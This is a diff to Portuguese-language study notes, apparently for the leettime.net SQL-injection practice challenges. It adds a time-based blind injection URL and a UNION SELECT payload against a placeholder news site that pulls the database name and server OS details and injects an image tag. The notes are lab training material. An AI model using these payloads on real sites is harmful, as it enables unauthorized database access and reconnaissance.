@@ -89,3 +89,19 @@ http://leettime.net/sqlninja.com/tasks/basic_ch4.php?id=1') and sleep(5) --+anak
 ```
 
 ![chall_4](https://raw.githubusercontent.com/e-anakein/leettime/master/images/photo_2019-05-24_23-10-32.jpg)
+
+
+------
+
+```
+http://leettime.net/sqlninja.com/tasks/basic_ch2.php?id=1 and sleep(5);%00
+```
+
+**order by coluna_name**
+
+ordena as colunas dentro de uma tabela
+
+```
+http://www.seusite.com.br/noticias.php?id=0 union select 0,0,0,database(),0,0,0,0,concat(@@version_compile_os,0x20,@@version_compile_machine),'<img src="http://weknowyourdreams.com/images/dragon/dragon-05.jpg">' --+1
+```
+
